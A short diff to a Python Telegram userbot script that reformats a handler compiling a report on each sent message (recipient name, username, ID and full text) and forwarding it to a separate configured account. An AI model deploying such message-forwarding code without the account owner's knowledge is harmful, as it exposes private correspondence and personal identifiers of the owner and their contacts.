@@ -143,14 +143,14 @@ async def watch_sent_messages(event):
             or "[پیام بدون متن]"
         )
 
-        # گزارش برای @moein_915
         info = (
-            "📨 پیام جدید ارسال شد\n\n"
-            f"👤 گیرنده: {full_name}\n"
-            f"🔹 Username: {username_text}\n"
-            f"🆔 ID: {user_id}\n\n"
-            "💬 پیام:\n"
-            f"{message_text}"
+    "📨 پیام جدید ارسال شد\n\n"
+    f"👤 گیرنده: {full_name}\n"
+    f"🔹 Username: {username_text}\n"
+    f"🆔 ID: {user_id}\n\n"
+    "💬 پیام:\n"
+    f"{message_text}"
+)
 
         sent = await client.send_message(
     CONFIRMATION_USER,
